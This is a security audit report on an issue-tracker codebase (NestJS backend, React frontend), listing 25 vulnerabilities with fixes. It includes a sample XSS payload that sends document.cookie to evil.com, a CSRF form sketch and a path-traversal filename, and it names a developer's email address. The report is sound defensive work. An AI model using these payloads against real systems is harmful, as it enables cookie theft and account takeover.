# Security Vulnerability Report — Bug Tracker

**Scope:** Full codebase review — backend NestJS services, frontend React pages, Prisma schema, auth flow, file uploads, email system.
**Method:** Manual static analysis, OWASP Top 10 mapping, edge-case tracing.
**Date:** 2026-07-14

---

## CRITICAL

### V-01: Hardcoded JWT Secret Fallback
- **File:** `backend/src/modules/auth/strategies/jwt.strategy.ts:16`
- **Code:** `secretOrKey: process.env.JWT_SECRET || 'dev-secret-do-not-use-in-prod'`
- **Impact:** If `JWT_SECRET` is unset or empty in production, the app silently falls back to a publicly visible hardcoded secret. Any attacker who reads the source code can forge valid JWTs for any user, including SUPER_ADMIN.
- **CVSS:** 9.8 (Critical) — Network-accessible, no authentication required, full compromise.
- **Fix:** Throw an error at startup if `JWT_SECRET` is not set in production:
  ```ts
  const secret = process.env.JWT_SECRET;
  if (!secret) throw new Error('JWT_SECRET environment variable is required');
  ```

### V-02: SMTP Credentials Committed to Disk
- **File:** `backend/.env:26-29`
- **Content:** Contains live Brevo SMTP credentials (`xsmtpsib-...` API key, sender email).
- **Impact:** While `.gitignore` excludes `backend/.env` from version control, the credentials exist on the local filesystem in plaintext. Anyone with filesystem access (shared server, backup leak, developer machine theft) gains full SMTP sending capability. The credentials can be used to send phishing emails from `najmulalamrivan@gmail.com`.
- **Fix:** Move credentials to a secrets manager (Vault, AWS Secrets Manager, env injection at deploy time). Rotate the exposed Brevo API key immediately.

## HIGH

### V-03: Email HTML Injection (Stored XSS in Emails)
- **File:** `backend/src/modules/notifications/email.service.ts:50-122`
- **Vulnerable lines:** 71, 78, 82, 87, 94, 98, 102, 109, and similar in `buildText()`
- **Impact:** User-controlled fields (`issue.title`, `issue.description`, `issue.type`, `issue.priority`, `issue.status`, `issue.module`) are interpolated directly into HTML email templates without escaping. An attacker can create an issue with title:
  ```
  Test <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
  ```
  While many email clients strip `<script>`, others allow `<img onerror>`, `<svg onload>`, or CSS-based data exfiltration. The HTML text version is also vulnerable since it includes raw user input.
- **Exploitation:** Create a malicious issue → system sends assignment/overdue emails to all recipients → payloads execute in their email clients.
- **Fix:** Create an `escapeHtml()` utility and apply it to all interpolated values:
  ```ts
  function escapeHtml(str: string): string {
    return str.replace(/&/g, '&amp;').replace(/</g, '&lt;')
              .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }
  ```
  Apply to every `issue.*` value in `buildHtml()` and `buildText()`.

### V-04: No Email Format Validation on Forgot-Password Endpoint
- **File:** `backend/src/modules/auth/auth.controller.ts:71`
- **DTO:** `{ email: string }` — no validation decorators
- **Impact:** The endpoint accepts any value as `email` — integers, objects, extremely long strings. This enables:
  1. **Email bombing:** Send arbitrary strings to the SMTP server, consuming resources and potentially targeting third-party mailboxes.
  2. **Log injection:** Inject newlines or control characters into log files.
  3. **Server-side request forgery (SSRF):** If the email value is passed to an SMTP library without sanitization, it could trigger unexpected behavior.
- **Fix:** Add a proper DTO with `@IsEmail()`:
  ```ts
  class ForgotPasswordDto {
    @IsEmail()
    @IsNotEmpty()
    email: string;
  }
  ```

### V-05: Deactivated Users Retain Full Access
- **File:** `backend/src/modules/auth/strategies/jwt.strategy.ts:20-25`, `auth.service.ts:166-177`
- **Impact:** Once a JWT is issued (valid for 24h by default), deactivating a user does NOT invalidate their token. The JWT strategy only checks `userId` and `role` — it never verifies the user's current `status` in the database. A terminated employee, a deactivated compromised account, or an admin-deactivated user retains full API access for up to 24 hours.
- **Attack scenario:** Admin deactivates a compromised user account. The attacker continues making API calls (creating issues, uploading attachments, changing statuses) using the still-valid JWT.
- **Fix (two options):**
  1. **Fast:** Include `status` in the JWT payload and check it in the strategy's `validate()` method. Requires re-login after deactivation.
  2. **Robust:** Maintain a token denylist (Redis set with TTL matching JWT expiry). Check denylist in the guard.

### V-06: File Upload Has No Virus/Malware Scanning
- **File:** `backend/src/modules/storage/local-storage.service.ts:37-39`
- **Code:** `async scanFile(_storagePath: string): Promise<boolean> { return true; }`
- **Impact:** The `scanFile` method is a placeholder that always returns `true`. Any file uploaded — including executables, scripts, or malware — passes the "security scan" and is stored on the filesystem. If the upload directory is web-accessible or served, this enables:
  - Serving malware to users who download attachments
  - Storing web shells if the upload dir is under a web root
  - Filling disk with malicious payloads
- **Fix:** Integrate ClamAV (`clamscan`), or use a cloud scanning API (AWS S3 virus scanning, VirusTotal). At minimum, reject files with known-malicious extensions.

### V-07: No Project Access Check for Attachment Upload
- **File:** `backend/src/modules/attachments/attachments.service.ts:139-142`
- **Code comment:** `// Part E: No visibility restriction — any authenticated user can attach files to any issue`
- **Impact:** Any authenticated user can upload files to any issue, even if they have no project membership or organizational relationship. This violates the principle of least privilege and could be exploited to:
  - Attach malicious files to sensitive issues
  - Inject large files to consume storage
  - Bypass project-level access controls
- **Fix:** Add `assertProjectAccess` check before allowing upload, consistent with the rest of the authorization model.

## MEDIUM

### V-08: Attachment Filename Not Sanitized (Path Traversal)
- **File:** `backend/src/modules/attachments/attachments.service.ts:169`
- **Code:** `fileName: file.originalname`
- **Impact:** `file.originalname` is attacker-controlled. While `local-storage.service.ts` uses a UUID for the actual storage path (mitigating path traversal on disk), the unsanitized filename is:
  1. Stored in the database and rendered in the frontend (React escapes JSX, so XSS is mitigated)
  2. Returned in the `Content-Disposition` header for downloads — a filename like `../../../etc/passwd` could confuse download managers
  3. Used in the activity log (`newValue: file.originalname`)
- **Fix:** Sanitize: `const safeName = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 255)`

### V-09: Internal Storage Path Leaked via API
- **File:** `backend/src/modules/attachments/attachments.service.ts:251-263`
- **Impact:** `getAttachmentMeta()` returns the full attachment object including `storagePath` (e.g., `/app/uploads/abc123.pdf`). This leaks internal server filesystem structure. While `uploadToIssue()` strips `storagePath` (line 183), `getAttachmentMeta()` does not.
- **Fix:** Exclude `storagePath` from the returned object:
  ```ts
  const { storagePath, ...safeAttachment } = attachment;
  return safeAttachment;
  ```

### V-10: Weak CSV File Type Detection
- **File:** `backend/src/modules/attachments/attachments.service.ts:72-75`
- **Code:** `if (/^[a-zA-Z0-9",\-]/.test(first)) return 'text/csv';`
- **Impact:** The regex matches the first 4 bytes of almost any ASCII text file. A binary file (e.g., `.exe`, `.sh`) whose first bytes happen to be alphanumeric will be detected as `text/csv`, bypassing the MIME validation. Combined with V-06 (no virus scanning), this is a bypass path for malicious file uploads.
- **Fix:** Remove the heuristic CSV detection entirely. CSV files have no reliable magic bytes. Instead, trust the browser's declared MIME type for CSV (which is correct in modern browsers) and document that CSV is allowed.

### V-11: No CSRF Protection on State-Changing Endpoints
- **File:** `backend/src/modules/auth/auth.controller.ts:41-48`
- **Code:** Cookie `sameSite` is `lax` in dev, `none` in prod
- **Impact:** In production, `sameSite: 'none'` means the cookie is sent on cross-origin requests. Combined with `credentials: 'include'` on the frontend, this enables CSRF attacks: a malicious page can make authenticated requests to the API. The only protection is the `Authorization` header check, but the backend accepts tokens from BOTH the cookie AND the header (`jwt.strategy.ts:11-14`). Since the cookie is always sent, CSRF is possible.
- **Attack scenario:** Attacker hosts a page with `<form method="POST" action="https://api.example.com/issues">` — the browser sends the `access_token` cookie automatically.
- **Fix:** Either:
  1. Use `sameSite: 'strict'` in production (breaks some cross-origin flows)
  2. Implement CSRF tokens for cookie-based auth
  3. Remove cookie-based auth entirely and use only `Authorization` header (recommended)

### V-12: Deleted User Emails Still Receive Notifications
- **File:** `backend/src/modules/users/users.service.ts:335-338`
- **Code:** Soft-delete sets email to `deleted-${id}@deleted.com`
- **Impact:** The soft-delete renames the email but doesn't prevent notifications. The `notifications.service.ts` sends emails to users by their `userId`, and the `emailService` looks up the user by ID to get their email. Since the soft-deleted user still exists in the DB, they WILL receive overdue/assignment emails at `deleted-{id}@deleted.com`. This is a minor email spam issue but also reveals that a user was deleted (the email pattern is predictable).
- **Fix:** Check `user.status === 'ACTIVE'` before sending emails, or filter out `deleted-*` emails in the email service.

### V-13: Password Reset Token Not Invalidated on Password Change
- **File:** `backend/src/modules/auth/auth.service.ts:205-233`
- **Impact:** If a user changes their password through normal means (not via reset), existing password reset tokens remain valid. An attacker who obtained a reset token (e.g., from email interception) can use it even after the user has changed their password.
- **Fix:** Delete all reset tokens for the user when their password is changed. Add `await this.prisma.passwordResetToken.deleteMany({ where: { userId: user.id } })` after the password update.

### V-14: No Rate Limiting on Issue Creation
- **File:** `backend/src/app.module.ts:17`
- **Code:** `ThrottlerModule.forRoot([{ ttl: 60_000, limit: 100 }])`
- **Impact:** The global throttle is 100 requests per minute per IP. This applies to ALL endpoints equally. A motivated attacker can create 100 issues per minute, flooding the system with spam issues and overwhelming notification recipients. There's no per-user or per-endpoint rate limiting.
- **Fix:** Add endpoint-specific throttling: `@Throttle({ default: { limit: 10, ttl: 60_000 } })` on the issue creation endpoint.

## LOW

### V-15: Whitespace-Only Input Accepted for Title/Description
- **File:** `backend/src/modules/issues/dto/create-issue.dto.ts:6-7`
- **Impact:** `@IsNotEmpty` only rejects empty strings, not whitespace-only strings. A title of `"   "` creates an invisible issue that clutters the database and appears blank in the UI.
- **Fix:** Add `@Transform(({ value }) => value?.trim())` from `class-transformer` to all string DTOs, or use a custom validator.

### V-16: Invalid Deadline Date Not Caught
- **File:** `backend/src/modules/issues/issues.service.ts:42-44`
- **Code:** `const deadline = new Date(dto.deadline); if (deadline <= new Date()) throw ...`
- **Impact:** If `dto.deadline` is a malformed string (e.g., `"not-a-date"`), `new Date()` returns `Invalid Date`. The comparison `Invalid Date <= new Date()` evaluates to `false`, so the check passes. The issue is created with an `Invalid Date` deadline, which Prisma may reject with a cryptic 500 error or store as a garbage value.
- **Fix:** Add `if (isNaN(deadline.getTime())) throw new BadRequestException('Invalid deadline format')`.

### V-17: Comment Text Not Length-Bounded
- **File:** `backend/src/modules/issues/dto/add-comment.dto.ts:3-6`
- **Impact:** The `text` field has `@IsString @IsNotEmpty` but no `@MaxLength()`. A user can submit a multi-megabyte comment string, consuming database storage and causing slow renders on the frontend.
- **Fix:** Add `@MaxLength(10000)` or similar limit.

### V-18: Issue Title Not Length-Bounded
- **File:** `backend/src/modules/issues/dto/create-issue.dto.ts:6-7`
- **Impact:** Same as V-17 — no `@MaxLength()` on `title`. A 10MB title string would be stored in the database.
- **Fix:** Add `@MaxLength(500)`.

### V-19: Module Field Not Length-Bounded
- **File:** `backend/src/modules/issues/dto/create-issue.dto.ts:26-27`
- **Impact:** Same pattern — no max length on `module`.
- **Fix:** Add `@MaxLength(200)`.

### V-20: Error Messages Leak Internal Details
- **File:** `backend/src/modules/issues/issues.service.ts:528-533`
- **Impact:** Prisma constraint violation errors (e.g., unique constraint on project name) bubble up as raw database error messages in some edge cases. While NestJS's default exception filter sanitizes 500s, 400/403 errors may include internal state.
- **Severity:** Low — standard NestJS behavior, but worth verifying in production error responses.

## INFORMATIONAL (Best Practice Gaps)

### V-21: No Security Headers Configuration
- **Missing:** `helmet` middleware is not used. No `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security` headers.
- **Fix:** Add `helmet` middleware in `main.ts`.

### V-22: No Request Size Limits Beyond File Uploads
- **Missing:** No `app.use(express.json({ limit: '1mb' }))` configuration. A POST body with a 100MB JSON payload could cause memory exhaustion.
- **Fix:** Configure body size limits in the NestJS bootstrap.

### V-23: No Audit Trail for Authentication Events
- **Missing:** Failed login attempts, password resets, and user deactivations are not logged to an audit trail. Only application-level activity logs exist for issues.
- **Fix:** Add authentication event logging (login success/failure, password changes, account lockouts).

### V-24: Test Database Uses Same Credentials as Production Pattern
- **File:** `backend/.env.test:2`
- **Code:** `DATABASE_URL="postgresql://postgres:postgres@localhost:5432/issue_tracker_test?schema=public"`
- **Impact:** Uses `postgres:postgres` (default credentials). While this is a local test DB, it reinforces insecure defaults.
- **Fix:** Use a separate role with limited permissions for test databases.

### V-25: No Content-Security-Policy in Email Templates
- **File:** `backend/src/modules/notifications/email.service.ts:61-122`
- **Impact:** Email HTML loads no external resources (good), but also doesn't include any security headers. The email body is self-contained HTML without CSP metadata.
